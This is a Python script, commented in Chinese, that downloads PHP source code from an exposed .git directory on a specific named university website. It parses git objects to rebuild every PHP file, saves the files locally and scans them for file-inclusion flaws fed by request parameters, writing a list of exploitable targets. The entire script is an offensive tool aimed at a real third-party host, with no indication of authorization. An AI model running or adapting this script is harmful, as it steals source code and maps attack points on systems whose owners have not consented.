#!/usr/bin/env python3
import requests
import urllib3
import zlib
import re
import os
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "https://olympic.su.ac.th/.git"
output_dir = "/tmp/php_audit"
os.makedirs(output_dir, exist_ok=True)

print("[*] 审计PHP源码寻找文件包含点...")

def download_file(file_hash, filename):
    blob_path = f"{base_url}/objects/{file_hash[:2]}/{file_hash[2:]}"
    blob_resp = requests.get(blob_path, verify=False, timeout=5)
    
    if blob_resp.status_code == 200:
        blob_data = zlib.decompress(blob_resp.content)
        null_header = blob_data.find(b'\x00')
        content = blob_data[null_header+1:] if null_header != -1 else blob_data[50:]
        return content.decode('utf-8', errors='ignore')
    return None

def parse_tree(tree_hash, path=""):
    tree_path = f"{base_url}/objects/{tree_hash[:2]}/{tree_hash[2:]}"
    tree_resp = requests.get(tree_path, verify=False, timeout=5)
    
    if tree_resp.status_code != 200:
        return []
    
    tree_data = zlib.decompress(tree_resp.content)
    files = []
    
    pos = 0
    while pos < len(tree_data):
        null_pos = tree_data.find(b'\x00', pos)
        if null_pos == -1:
            break
        
        entry = tree_data[pos:null_pos]
        parts = entry.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            
            hash_start = null_pos + 1
            if hash_start + 20 <= len(tree_data):
                file_hash = tree_data[hash_start:hash_start+20].hex()
                
                if mode.startswith('4'):  # tree
                    sub_files = parse_tree(file_hash, f"{path}{filename}/")
                    files.extend(sub_files)
                elif filename.endswith('.php'):  # blob
                    files.append((f"{path}{filename}", file_hash))
        
        pos = null_pos + 21
    
    return files

# 获取所有PHP文件
root_tree = "206be85b2f5820dcbb812b49c73c77c48027d4d3"
all_php_files = parse_tree(root_tree)

print(f"[+] 找到 {len(all_php_files)} 个PHP文件")

include_vulns = []

for file_path, file_hash in all_php_files:
    content = download_file(file_hash, file_path)
    
    if not content:
        continue
    
    # 保存文件
    safe_path = file_path.replace('/', '_').replace('\\', '_')
    with open(f"{output_dir}/{safe_path}", 'w', encoding='utf-8', errors='ignore') as f:
        f.write(content)
    
    # 分析文件包含
    vuln_patterns = [
        (r'(include|require)[\s]*\([^)]*\$_(?:GET|POST|REQUEST|COOKIE)', 'include with GET/POST'),
        (r'(include|require)[\s]*\([^)]*\$_(?:GET|POST|REQUEST|COOKIE)', 'include with REQUEST'),
        (r'file_get_contents\s*\([^)]*\$_(?:GET|POST|REQUEST)', 'file_get_contents'),
        (r'readfile\s*\([^)]*\$_(?:GET|POST|REQUEST)', 'readfile'),
        (r'fopen\s*\([^)]*\$_(?:GET|POST|REQUEST)', 'fopen'),
        (r'file\s*\([^)]*\$_(?:GET|POST|REQUEST)', 'file function'),
    ]
    
    for pattern, vuln_type in vuln_patterns:
        matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
        if matches:
            # 提取参数名
            param_matches = re.findall(r'\$_(?:GET|POST|REQUEST|COOKIE)\[["\']([^"\']+)["\']\]', content)
            
            include_vulns.append({
                'file': file_path,
                'type': vuln_type,
                'params': list(set(param_matches)),
                'code': matches[:3]
            })
            
            print(f"[!] {file_path}")
            print(f"    漏洞: {vuln_type}")
            print(f"    参数: {list(set(param_matches))[:5]}")
            break

print(f"\n[+] 发现 {len(include_vulns)} 个文件包含漏洞")
print(f"[+] 文件保存在: {output_dir}")

# 保存漏洞列表
with open(f"{output_dir}/vulns.txt", 'w') as f:
    for vuln in include_vulns:
        f.write(f"{vuln['file']}|{vuln['type']}|{','.join(vuln['params'])}\n")

print(f"[+] 漏洞列表已保存: {output_dir}/vulns.txt")
